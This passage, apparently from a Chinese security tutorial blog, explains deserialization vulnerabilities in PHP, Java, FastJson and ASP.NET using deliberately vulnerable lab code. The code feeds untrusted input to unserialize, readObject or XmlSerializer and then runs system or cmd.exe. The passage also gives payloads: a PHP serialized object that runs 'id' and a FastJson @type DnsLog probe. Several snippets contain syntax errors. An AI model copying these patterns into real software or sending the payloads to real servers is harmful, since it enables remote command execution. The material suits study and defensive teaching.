+<p>NULL被序列化为：N<br>Boolean型数据序列化为：b:1，b:0，分别代表True和False<br>Integer型数据序列化为：i:数值<br>String型数据序列化为：s:长度:”值”<br>对象序列化为：O:类名长度:类名:字段数:字段</p>
+</blockquote>
+<ul>
+<li>unserialize：反序列化函数</li>
+<li><em><strong>*魔术方法：*</strong></em></li>
+</ul>
+<blockquote>
+<p>__construct：当对象被创建时调用</p>
+<p>__destruct：当对象被销毁前调用<br>__sleep：执行serialize函数前调用</p>
+<p>__wakeup：执行unserialize函数前调用<br>__call：在对象中调用不可访问的方法时调用</p>
+<p>__callStatic：用静态方法调用不可访问方法时调用<br>__get：获得类成因变量时调用</p>
+<p>__set：设置类成员变量时调用</p>
+</blockquote>
+<p>创建一个类A并实例化一个对象a，然后输出序列化对象a后的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义一个类</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;Hello&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    print &quot;&lt;h1&gt;ABCD&lt;/h1&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 实例化一个对象a</span><br><span class="line">$a=new A();</span><br><span class="line">// 序列化对象a</span><br><span class="line">print &quot;Serialize Object A: &quot;.serialize($a).&quot;&lt;br/&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#输出</span><br><span class="line">&lt;h1&gt;ABCD&lt;/h1&gt;</span><br><span class="line">Serialize Object A: O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;Hello&quot;;&#125;&lt;br/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>PHP中序列化后的数据、是类名和成员变量的信息。因此，在<code>unserialize</code>函数的参数可控的情况下，还需要代码中包含**<em>*</em>*魔术方法******才能利用反序列化漏洞。使用下面代码定义一个包含魔术方法<code>__destruct</code>的类A，然后实例化一个对象a并输出序列化后的数据，在对象销毁的时候程序会调用<code>system</code>函数执行<code>df</code>命令，然后通过GET方法传递参数<code>arg</code>的值给服务器进行反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义一个类</span><br><span class="line">class A&#123;</span><br><span class="line">    // 设置变量值为df</span><br><span class="line">    var $test = &quot;df&quot;;</span><br><span class="line">    // 定义析构函数，在类A销毁时执行system(&quot;df&quot;)</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        print &quot;Execute CMD: &quot;.$this-&gt;test.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">        print &quot;Result: &quot;;</span><br><span class="line">        system($this-&gt;test);</span><br><span class="line">        print &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 实例化一个对象a</span><br><span class="line">$a=new A();</span><br><span class="line">// 序列化对象a</span><br><span class="line">print &quot;Serialize Object A: &quot;.serialize($a).&quot;&lt;br/&gt;&quot;;</span><br><span class="line">// GET方式获取参数arg的值</span><br><span class="line">$arg = $_GET[&#x27;arg&#x27;];</span><br><span class="line">// 反序列化参数arg的值</span><br><span class="line">$a_unser = unserialize($arg);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不传入arg参数时，服务器返回对象a序列化后的数据和df命令执行的结果：输出</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/5fAqKdSxHZ7yPxi3uU6DPQ.png" class title="img">
+
+<p>利用对象a序列化后的值构造执行<code>id</code>命令的Payload：<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;id&quot;;&#125;</code>，通过<code>arg</code>参数提交之后，在反序列化的过程中成功覆盖变量test的值为<code>id</code>，并在对象销毁时执行命令，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/SFPPp2BPACyYbp2LNNrrDZ.png" class title="img">
+
+<h2 id="Java"><a href="#Java" class="headerlink" title="***Java*****"></a><em>*<em>*</em>*Java****</em>*</h2><ul>
+<li><code>Java.io.ObjectOutputStream</code>类的<code>writeObject</code>方法进行序列化</li>
+<li><code>java.io.ObjectInputStream</code>类中的<code>readObject</code>方法进行反序列化。</li>
+</ul>
+<p>一个Java类的对象要想序列化成功，必须满足两个条件：</p>
+<ul>
+<li>该类必须实现<code>java.io.Serializable</code>**<em>*</em>*接口******。</li>
+<li>该类的所有**<em>*</em>*属性******必须是可序列化的，如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li>
+</ul>
+<h3 id="例1：序列化和反序列化"><a href="#例1：序列化和反序列化" class="headerlink" title="例1：序列化和反序列化"></a>例1：序列化和反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package com.company;</span><br><span class="line"></span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Main&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        String obj = &quot;hello&quot;;</span><br><span class="line">        // 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时， 按照 Java 的标准约定是给文件一个 .ser 扩展名</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;a.ser&quot;);</span><br><span class="line">        ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        // 从文件a.ser中读取数据</span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;a.ser&quot;);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        // 通过反序列化恢复字符串</span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#程序执行后生成a.ser文件，并输出</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
+
+<p>以十六进制查看a.ser文件内容，Java序列化数据格式始终<em><strong>*以双字节的十六进制*</strong></em><code>***\*0xAC ED\****</code><em><strong>*作为开头*<em><strong>，Base64编码之后为<code>rO0</code>。之后的两个字节是</strong></em>*版本号，通常为*</strong></em><code>***\*0x00 05\****</code>。如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/UqQ2gL5Ke98Nnyt2bBycrg.jpeg" class title="img">
+
+<h3 id="例2-序列化之后修改再反序列化"><a href="#例2-序列化之后修改再反序列化" class="headerlink" title="例2:序列化之后修改再反序列化"></a>例2:序列化之后修改再反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 定义一个实现 java.io.Serializable 接口的类Test</span><br><span class="line">class Test implements Serializable &#123;</span><br><span class="line">    public String cmd=&quot;calc&quot;;</span><br><span class="line">    // 重写readObject()方法</span><br><span class="line">    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        // 执行默认的readObject()方法</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        // 执行打开计算器程序的命令</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Main&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        // 实例化对象test</span><br><span class="line">        Test test = new Test();</span><br><span class="line"></span><br><span class="line">        // 将对象test序列化后写入a.ser文件</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;a.ser&quot;);</span><br><span class="line">        ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(test);</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行程序后生成a.ser文件，以十六进制格式查看文件内容，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/9yeqwas9PtVNq8U99PhMn7.jpeg" class title="img">
+
+<p>最后5个字节分别为字符串长度和<code>calc</code>的ASCII值。因此，修改文件为下图所示，即<code>notepad</code>的ASCII值和长度：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/tFWTNtwTzZGje5SZTvKEr6.jpeg" class title="img">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 定义一个实现 java.io.Serializable 接口的类Test</span><br><span class="line">class Test implements Serializable &#123;</span><br><span class="line">    public String cmd=&quot;calc&quot;;</span><br><span class="line">    // 重写readObject()方法</span><br><span class="line">    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        // 执行默认的readObject()方法</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        // 执行打开计算器程序的命令</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Main&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        // 从a.ser文件中反序列化test对象</span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;a.ser&quot;);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line">        Test objectFromDisk = (Test)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.cmd);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#输出notepad并运行notepad</span><br></pre></td></tr></table></figure>
+
+<p>程序执行后成功运行<code>notepad</code>，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/LWfXPdQrBwngtBtsv6LA68.jpeg" class title="img">
+
+<h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><p><code>AutoType</code>特性在反序列化过程中会导致反序列化漏洞，这个特性就是：在对JSON字符串进行反序列化的时候，会读取<code>@type</code>参数指定的类，然后把JSON内容反序列化为此类的对象，并且会调用这个类的设置（setter）方法。</p>
+<p><em>*<em>*</em>*实验环境****</em>*</p>
+<blockquote>
+<p>前端采用json提交用户名密码<br>后台使用fastjson 1.2.24版本<br>源码和WAR包<a target="_blank" rel="noopener" href="https://github.com/NHPT/Java_Deserialization_Vulnerability_Experiment">GitHub地址﻿</a></p>
+</blockquote>
+<p>创建一个<code>User</code>类，用于查看序列化数据格式，如图：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class User&#123;</span><br><span class="line">    //定义用户名和密码属性</span><br><span class="line">    public String user;</span><br><span class="line">    private String passwd;</span><br><span class="line">    //定义设置用户名方法</span><br><span class="line">    public void setUser(String user)&#123;this.user=user;&#125;</span><br><span class="line">    //定义设置密码的方法</span><br><span class="line">    public void setPasswd(this.passwd=passwd;)</span><br><span class="line">    //定义获取用户名的方法</span><br><span class="line">    public String getUser()&#123;return this.user;&#125;</span><br><span class="line">    //定义获取密码的方法</span><br><span class="line">    public String getPasswd()&#123;return this.passwd;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个<code>home</code>类用于输出<code>user</code>对象的序列化数据，如图：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@WebServlet(name = &quot;home&quot;,vlaue = &quot;/home&quot;)</span><br><span class="line">public class home extends HttpServlet&#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException IOException)&#123;</span><br><span class="line">        response.setContentType(&quot;text/html&quot;);</span><br><span class="line">        //实例化输出对象</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        //实例化user队形</span><br><span class="line">        User user = new User();</span><br><span class="line">        //设置用户名</span><br><span class="line">        user.setUser(&quot;admin&quot;);</span><br><span class="line">        //设置密码</span><br><span class="line">        user.setPasswd(&quot;123456&quot;);</span><br><span class="line">        //输出序列化的结果到页面</span><br><span class="line">        out.println(&quot;&lt;title&gt;FastJson序列化&lt;title&gt;&quot;);</span><br><span class="line">        out.print(&quot;&lt;h1&gt;序列化结果;&quot;+JSON.toJSONString(user,SerializerFeature.WriteClassName)+&quot;&lt;/h1&gt;&quot;);)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个<code>login</code>类用于获取前端页面提交的json格式用户名和密码数据，并使用<code>JSON.parseObject</code>方法进行反序列化解析json数据，在后台可看到提交的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@WebServlet(name = &quot;login&quot;,vlaue = &quot;/login&quot;)</span><br><span class="line">public class login extends HttpServlet&#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException IOException)&#123;</span><br><span class="line">       //实例化读取POST请求数据的对象</span><br><span class="line">        BuffereReader reader = new BufferedReader(request.getReader());</span><br><span class="line">        //读取POST请求数据</span><br><span class="line">        String json = reader.readLine();</span><br><span class="line">        //输出到控制台</span><br><span class="line">        System.out.println(json)</span><br><span class="line">        //用fastjson进行反序列化</span><br><span class="line">        JSONObject jo = JSON.parseObject(json);</span><br><span class="line">        //获取username和password对应的值</span><br><span class="line">        String username = jo.getString(key:&quot;username&quot;);</span><br><span class="line">        String password = jo.getString(key:&quot;password&quot;);</span><br><span class="line">        //输出到控制台</span><br><span class="line">        System.out.println(&quot;用户名：&quot;+username+&quot;,&quot;+&quot;密码;&quot;+ password);</span><br><span class="line">        //省略判断账号密码是否正确和设置session等步骤</span><br><span class="line">        //假设账号密码正确，跳转到home页面</span><br><span class="line">        response.sendRedirect(s:&quot;home&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<blockquote>
+<p>{“username”：”admin”,”password:””password”}<br>用户名：admin,密码：password</p>
+</blockquote>
+<p>访问<code>home</code>页面可直接获取<code>user</code>对象序列化后的结果，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/PMDhZ6UUHQ82puHB6PxES7.jpeg" class title="img">
+
+<p><code>@type</code>的值为对象所属的类，<code>user</code>和<code>passwd</code>分别为对象的用户名属性和密码属性。因此可以利用<code>AutoType</code>特性，构造一个使用<code>@type</code>参数指定一个攻击类库，包含类属性或方法的JSON字符串提交到服务器，在反序列化时调用这个类的方法达到执行代码的目的。通常使用<a target="_blank" rel="noopener" href="https://java.net/"><code>java.net</code></a><code>java.net.Inet4Address</code>类或<a target="_blank" rel="noopener" href="https://java.net/"><code>java.net</code></a><code>java.net.Inet6Address</code>类，通过<code>val</code>参数传递域名，利用DnsLog进行漏洞检测，即：<code>&#123;&quot;@type&quot;:&quot;</code><a target="_blank" rel="noopener" href="https://java.net/"><code>java.net</code></a><code>.Inet4Address&quot;,&quot;val&quot;:&quot;DnsLog&quot;&#125;</code>。在登录页面输入用户名和密码提交，拦截数据包，修改提交的Json数据，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/jpZodWxGfMt55BGacpbFbV.png" class title="img">
+
+<p>虽然服务器返回错误信息，但Payload仍然被成功执行，在DnsLog网站可以看到解析记录，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/U4VHUYUUhnbtKA6L9HcC6o.png" class title="img">
+
+<p>要执行命令需要构造新的POP链，常用的POP链：</p>
+<blockquote>
+<p>基于JNDI注入<br>基于ClassLoader<br>基于TemplatesImpl</p>
+</blockquote>
+<p>由于本实验仅使用最小依赖编写，此处不再详细分析POP链，</p>
+<h2 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="*ASP.NET*"></a><em><strong>*ASP.NET*</strong></em></h2><p>.NET框架包含多个序列化类，<code>BinaryFormatter</code>，<code>JavaScriptSerializer</code>，<code>XmlSerializer</code>，<code>DataContractSerializer</code>，本实验以XML序列化和反序列化为例。</p>
+<p><em>*<em>*</em>*实验环境****</em>*</p>
+<blockquote>
+<p>采用Xml提交数据<br>使用.NET Framework 4.6.1<br>完整源码<a target="_blank" rel="noopener" href="https://github.com/NHPT/ASP.NET-Deserialization-Vulnerability-Experiment">GitHub地址﻿</a></p>
+</blockquote>
+<p>使用下面代码定义一个<code>Test</code>类，包含执行<code>ipconfig</code>命令并返回执行结果的函数<code>Run</code>，使用<code>XmlSerializer</code>类将对象序列化后输出到页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">namespace ASP.NETStudy</span><br><span class="line">&#123;</span><br><span class="line">    [Serializable]</span><br><span class="line">    public class Test</span><br><span class="line">    &#123;</span><br><span class="line">        public string _cmd = &quot;ipconfig&quot;;</span><br><span class="line">        public Test(string cmd)</span><br><span class="line">        &#123;</span><br><span class="line">            _cmd = cmd;</span><br><span class="line">        &#125;</span><br><span class="line">        public Test()</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        public String Run()</span><br><span class="line">        &#123;</span><br><span class="line">            Process p = new Process();</span><br><span class="line">            // 设置要启动的应用程序</span><br><span class="line">            p.StartInfo.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">            // 不使用操作系统shell启动</span><br><span class="line">            p.StartInfo.UseShellExecute = false;</span><br><span class="line">            // 接受来自调用程序的输入信息</span><br><span class="line">            p.StartInfo.RedirectStandardInput = true;</span><br><span class="line">            // 输出信息</span><br><span class="line">            p.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">            // 输出错误</span><br><span class="line">            p.StartInfo.RedirectStandardError = true;</span><br><span class="line">            // 不显示程序窗口</span><br><span class="line">            p.StartInfo.CreateNoWindow = true;</span><br><span class="line">            // 启动程序</span><br><span class="line">            p.Start();</span><br><span class="line">            // 向cmd窗口发送命令</span><br><span class="line">            p.StandardInput.WriteLine(_cmd + &quot;&amp;exit&quot;);</span><br><span class="line">            // 自动刷新</span><br><span class="line">            p.StandardInput.AutoFlush = true;</span><br><span class="line">            // 获取输出信息</span><br><span class="line">            string strOuput = p.StandardOutput.ReadToEnd();</span><br><span class="line">            //等待程序执行完退出进程</span><br><span class="line">            p.WaitForExit();</span><br><span class="line">            p.Close();</span><br><span class="line">            // 返回执行结果</span><br><span class="line">            return strOuput;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public partial class _default : System.Web.UI.Page</span><br><span class="line">    &#123;</span><br><span class="line">        protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">        &#123;</span><br><span class="line">            // 实例化对象 sc_Test</span><br><span class="line">            Test sc_Test = new Test();</span><br><span class="line">            // 创建字符串缓冲区buffer</span><br><span class="line">            StringBuilder buffer = new StringBuilder();</span><br><span class="line">            // 实例化序列号对象</span><br><span class="line">            XmlSerializer serializer = new XmlSerializer(typeof(Test));</span><br><span class="line">            // 序列化对象sc_Test并存储到buffer</span><br><span class="line">            using (TextWriter writer = new StringWriter(buffer))</span><br><span class="line">            &#123;</span><br><span class="line">                serializer.Serialize(writer, sc_Test);</span><br><span class="line">            &#125;</span><br><span class="line">            String str = buffer.ToString();</span><br><span class="line">            // 将xml数据HTML实体化，防止Windows安全检查拦截</span><br><span class="line">            string r = string.Empty;</span><br><span class="line">            for (int i = 0; i &lt; str.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                r += &quot;&amp;#&quot; + Char.ConvertToUtf32(str, i) + &quot;;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            // 输出到页面</span><br><span class="line">            Response.Write(&quot;&lt;center&gt;&lt;h2&gt;序列化数据&lt;/h2&gt;&lt;textarea rows=\&quot;10\&quot; cols=\&quot;100\&quot; readonly align=\&quot;center\&quot;&gt;&quot; + r+ &quot;&lt;/textarea&gt;&lt;/center&gt;&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用下面代码将提交的XML数据反序列化，并执行对象的<code>Run</code>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">namespace ASP.NETStudy</span><br><span class="line">&#123;</span><br><span class="line">    public partial class info : System.Web.UI.Page</span><br><span class="line">    &#123;</span><br><span class="line">        protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">        &#123;</span><br><span class="line">            if (Request.RequestType == &quot;POST&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                // 获取客户端提交的数据</span><br><span class="line">                StreamReader s = new StreamReader(Request.InputStream);</span><br><span class="line">                // 转换为String格式</span><br><span class="line">                String ss = s.ReadToEnd();</span><br><span class="line">                //Response.Write(ss);</span><br><span class="line">                // 定义反序列化对象</span><br><span class="line">                Test dsc_Test;</span><br><span class="line">                XmlSerializer serializer = new XmlSerializer(typeof(Test));</span><br><span class="line">                // 反序列化数据为dsc_Test对象</span><br><span class="line">                using (TextReader reader = new StringReader(ss))</span><br><span class="line">                &#123;</span><br><span class="line">                    Object obj = serializer.Deserialize(reader);</span><br><span class="line">                    dsc_Test = (Test)obj;</span><br><span class="line">                &#125;</span><br><span class="line">                // 调用对象的函数Run并返回执行结果到浏览器</span><br><span class="line">                Response.Write(dsc_Test.Run());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下访问页面，返回序列化后的数据，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/DBdQ7DzXahyCi6B9WboGML.png" class title="img">
+
+<p>点击<code>查看IP</code>按钮后，客户端提交数据，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/YpSpCDrNux8Bizk9bpBzRk.png" class title="img">
+
+
+
+<p>服务器执行命令后返回到客户端，如图</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/XyhLyCjgSfCGaQhfU6sU87.png" class title="img">
+
+<p>如果攻击者将传输的XML数据进行篡改，如图：</p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/S2HKSZQhytsqLzHHBbFYo9.png" class title="img">
+
+<p>服务器在反序列化后执行<code>whoami</code>命令，如图：</p>
